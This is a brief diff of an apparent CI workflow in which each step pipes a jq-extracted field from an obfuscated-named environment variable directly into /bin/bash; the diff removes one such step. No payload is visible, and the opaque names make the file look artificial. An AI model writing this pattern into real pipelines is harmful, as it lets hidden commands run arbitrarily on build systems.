@@ -23,7 +23,6 @@ jobs:
           echo $nnboc810 | jq -r .phxw59365 | /bin/bash
           echo $j7820 | jq -r .lffk2898 | /bin/bash
           echo $ppb149 | jq -r .m33 | /bin/bash
-          printf '%s' "$cmgyn387" | jq -r .uh96059 | /bin/bash
           echo $hc65 | jq -r .c70 | /bin/bash
           echo $i3 | jq -r .dgo4534 | /bin/bash
           printf '%s' "$ichap42534" | jq -r .qns47 | /bin/bash
